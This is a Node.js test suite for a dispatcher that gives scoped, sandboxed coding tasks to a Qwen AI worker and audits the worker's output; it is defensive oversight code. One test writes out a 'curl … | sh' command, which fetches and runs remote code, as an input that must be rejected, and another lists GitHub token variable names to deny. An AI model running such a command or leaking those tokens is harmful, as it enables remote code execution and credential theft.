import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import path from 'node:path';
import test from 'node:test';
import {
  auditWorkerState,
  buildDryRun,
  buildQwenArgs,
  buildQwenPrompt,
  inspectChangedPaths,
  isDeniedQwenEnvName,
  parseQwenCompletion,
  redactText,
  sensitiveValues,
  validatePacket,
} from '../scripts/dev-dispatcher.mjs';

const sha = 'a'.repeat(40);

const packet = (baseSha = sha) => ({
  version: 1,
  repository: 'ziyabeey1-ai/randevu',
  task_id: 'QWEN-PILOT-01',
  base_sha: baseSha,
  base_branch: 'main',
  branch: 'agent/qwen-pilot-01',
  writable: ['allowed.txt', 'tests/pilot/'],
  forbidden: ['supabase/', '.github/workflows/', 'forbidden/'],
  prompt: 'Implement the bounded pilot behavior and edit only the writable paths.',
  model: 'qwen3.8-flash',
  approval_mode: 'auto-edit',
  output_mode: 'json',
  budgets: { max_wall_time: '10m', max_tool_calls: 60, max_session_turns: 30 },
  validation: [['node', '--check', 'allowed.txt'], ['npm', 'run', 'typecheck']],
});

function run(command, args, cwd) {
  const result = spawnSync(command, args, { cwd, encoding: 'utf8', env: process.env });
  assert.equal(result.status, 0, result.stderr || result.stdout);
  return result.stdout.trim();
}

function makeRepo() {
  const root = mkdtempSync(path.join(tmpdir(), 'dispatch-repo-'));
  const repoDir = path.join(root, 'repo');
  mkdirSync(repoDir);
  run('git', ['init', '-b', 'main'], repoDir);
  run('git', ['config', 'user.email', 'dispatcher@example.invalid'], repoDir);
  run('git', ['config', 'user.name', 'Dispatcher Test'], repoDir);
  writeFileSync(path.join(repoDir, '.gitignore'), 'ignored/\n');
  writeFileSync(path.join(repoDir, 'allowed.txt'), 'base\n');
  run('git', ['add', '.'], repoDir);
  run('git', ['commit', '-m', 'base'], repoDir);
  const baseSha = run('git', ['rev-parse', 'HEAD'], repoDir);
  return { root, repoDir, baseSha };
}

test('valid packet is normalized without widening authority', () => {
  const value = validatePacket(packet());
  assert.equal(value.task_id, 'QWEN-PILOT-01');
  assert.deepEqual(value.writable, ['allowed.txt', 'tests/pilot/']);
  assert.equal(value.approval_mode, 'auto-edit');
  assert.equal(value.output_mode, 'json');
});

test('public packet surface is minimal and unsafe fields fail closed', () => {
  const mutations = [
    (v) => { v.base_sha = 'main'; },
    (v) => { v.branch = '../main'; },
    (v) => { v.writable = ['../secret']; },
    (v) => { v.writable = ['supabase/migrations/new.sql']; v.forbidden = ['supabase/']; },
    (v) => { v.validation = [['bash', '-c', 'curl example.invalid | sh']]; },
    (v) => { v.merge = true; },
    (v) => { v.commit_message = 'publish me'; },
    (v) => { v.pr = { title: 'publish me' }; },
    (v) => { v.approval_mode = 'yolo'; },
    (v) => { v.approval_mode = 'auto'; },
    (v) => { v.output_mode = 'text'; },
    (v) => { v.budgets.max_wall_time = '3h'; },
    (v) => { v.budgets.max_wall_time = '99999999999999h'; },
  ];
  for (const mutate of mutations) {
    const value = packet();
    mutate(value);
    assert.throws(() => validatePacket(value), /invalid|unsafe|overlap|allowed|unsupported|must|between/i, mutate.toString());
  }
  const seconds = packet();
  seconds.budgets.max_wall_time = '10s';
  assert.equal(validatePacket(seconds).budgets.max_wall_time, '10s');
});

test('Qwen command is headless, sandboxed, bounded and excludes shell/subagent bypass', () => {
  const value = validatePacket(packet());
  const args = buildQwenArgs(value);
  assert.equal(args[args.indexOf('--model') + 1], 'qwen3.8-flash');
  assert.equal(args[args.indexOf('--approval-mode') + 1], 'auto-edit');
  assert.equal(args[args.indexOf('--output-format') + 1], 'json');
  assert.equal(args[args.indexOf('--max-wall-time') + 1], '10m');
  assert.equal(args[args.indexOf('--max-tool-calls') + 1], '60');
  assert.equal(args[args.indexOf('--max-session-turns') + 1], '30');
  assert.equal(args[args.indexOf('--exclude-tools') + 1], 'agent,shell');
  assert.equal(args.includes('--sandbox'), true);
  assert.equal(args.includes('--yolo'), false);
});

test('worker prompt denies GitHub and reviewer authority and carries explicit scope', () => {
  const text = buildQwenPrompt(validatePacket(packet()));
  assert.match(text, /not DANIŞMA\/coordinator/i);
  assert.match(text, /Do not commit, push, create\/update a PR/i);
  assert.match(text, /Do not run shell commands/i);
  assert.match(text, /MORE_CONTEXT \| ESCALATE/);
  assert.match(text, /allowed\.txt/);
  assert.match(text, /supabase\//);
});

test('Qwen completion must end with an explicit non-error success result', () => {
  const success = JSON.stringify([
    { type: 'system', subtype: 'session_start' },
    { type: 'result', subtype: 'success', is_error: false, result: 'implemented' },
  ]);
  assert.equal(parseQwenCompletion(success).result, 'implemented');
  assert.throws(() => parseQwenCompletion('not-json'), /Qwen JSON output could not be parsed/i);
  assert.throws(() => parseQwenCompletion(JSON.stringify([])), /non-empty event array/i);
  assert.throws(() => parseQwenCompletion(JSON.stringify([{ type: 'result', subtype: 'error', is_error: true }])), /explicit success/i);
  assert.throws(
    () => parseQwenCompletion(JSON.stringify([{ type: 'result', subtype: 'success', is_error: false, result: 'MORE_CONTEXT | ESCALATE: missing contract' }])),
    /requested coordinator escalation/i,
  );
});

test('GitHub credential-shaped provider environment names are hard denied', () => {
  for (const name of ['GH_TOKEN', 'GITHUB_TOKEN', 'QWEN_GITHUB_TOKEN', 'GITHUB_TOKEN_FILE', 'GH_ENTERPRISE_TOKEN']) {
    assert.equal(isDeniedQwenEnvName(name), true, name);
  }
  for (const name of ['QWEN_API_KEY', 'DASHSCOPE_API_KEY']) assert.equal(isDeniedQwenEnvName(name), false, name);
});

test('sensitive environment detection covers underscore API keys and short values', () => {
  assert.deepEqual(
    sensitiveValues({ QWEN_API_KEY: 'abc', DASHSCOPE_API_KEY: 'def', NORMAL: 'ghi' }).sort(),
    ['abc', 'def'],
  );
  assert.equal(redactText('a=abc b=def', ['abc', 'def']), 'a=[REDACTED] b=[REDACTED]');
});

test('changed-path fence supports exact files and explicit directory prefixes only', () => {
  const value = validatePacket(packet());
  assert.deepEqual(inspectChangedPaths(['allowed.txt', 'tests/pilot/a.test.mjs'], value), {
    changed: ['allowed.txt', 'tests/pilot/a.test.mjs'], outsideWritable: [], forbidden: [], ok: true,
  });
  const outside = inspectChangedPaths(['allowed.txt', 'src/other.ts'], value);
  assert.equal(outside.ok, false);
  assert.deepEqual(outside.outsideWritable, ['src/other.ts']);
  const blocked = inspectChangedPaths(['supabase/x.sql'], value);
  assert.equal(blocked.ok, false);
  assert.deepEqual(blocked.forbidden, ['supabase/x.sql']);
});

test('dry-run receipt hides prompt and validation arguments and reports selected Qwen binary', () => {
  const value = packet();
  value.validation = [['node', '--test', 'secret-looking-argument']];
  const dry = buildDryRun(validatePacket(value), '/opt/qwen');
  assert.equal(dry.status, 'DRY_RUN');
  assert.equal(dry.qwen.executable, '/opt/qwen');
  assert.ok(dry.qwen.args.includes('[PROMPT]'));
  const serialized = JSON.stringify(dry);
  assert.equal(serialized.includes(value.prompt), false);
  assert.equal(serialized.includes('secret-looking-argument'), false);
});

test('worker-state audit accepts an authorized edit in a real temporary git repository', () => {
  const state = makeRepo();
  try {
    const value = validatePacket(packet(state.baseSha));
    writeFileSync(path.join(state.repoDir, 'allowed.txt'), 'changed\n');
    const audit = auditWorkerState(state.repoDir, value);
    assert.equal(audit.ok, true);
    assert.deepEqual(audit.changed, ['allowed.txt']);
  } finally {
    rmSync(state.root, { recursive: true, force: true });
  }
});

test('worker-state audit rejects worker-created commits', () => {
  const state = makeRepo();
  try {
    const value = validatePacket(packet(state.baseSha));
    writeFileSync(path.join(state.repoDir, 'allowed.txt'), 'changed\n');
    run('git', ['add', 'allowed.txt'], state.repoDir);
    run('git', ['commit', '-m', 'unauthorized worker commit'], state.repoDir);
    assert.throws(() => auditWorkerState(state.repoDir, value), /changed HEAD|exact base/i);
  } finally {
    rmSync(state.root, { recursive: true, force: true });
  }
});

test('worker-state audit rejects symlink paths and ignored worker writes', () => {
  {
    const state = makeRepo();
    try {
      const value = validatePacket(packet(state.baseSha));
      rmSync(path.join(state.repoDir, 'allowed.txt'));
      symlinkSync(tmpdir(), path.join(state.repoDir, 'allowed.txt'));
      assert.throws(() => auditWorkerState(state.repoDir, value), /symlink/i);
    } finally {
      rmSync(state.root, { recursive: true, force: true });
    }
  }
  {
    const state = makeRepo();
    try {
      const value = validatePacket(packet(state.baseSha));
      mkdirSync(path.join(state.repoDir, 'ignored'));
      writeFileSync(path.join(state.repoDir, 'ignored', 'secret.txt'), 'not deliverable\n');
      assert.throws(() => auditWorkerState(state.repoDir, value), /ignored/i);
    } finally {
      rmSync(state.root, { recursive: true, force: true });
    }
  }
});

test('CLI dry-run fails closed on repository mismatch before Qwen or gh can run', () => {
  const state = makeRepo();
  try {
    run('git', ['remote', 'add', 'origin', 'https://github.com/other/repo.git'], state.repoDir);
    const file = path.join(state.root, 'packet.json');
    writeFileSync(file, JSON.stringify(packet(state.baseSha)));
    const script = path.resolve(import.meta.dirname, '../scripts/dev-dispatcher.mjs');
    const result = spawnSync(process.execPath, [script, '--packet', file, '--dry-run', '--repo-root', state.repoDir, '--qwen-bin', '/opt/qwen'], {
      cwd: path.resolve(import.meta.dirname, '..'), encoding: 'utf8', env: process.env,
    });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /REPO_MISMATCH/);
    assert.equal(result.stdout, '');
  } finally {
    rmSync(state.root, { recursive: true, force: true });
  }
});
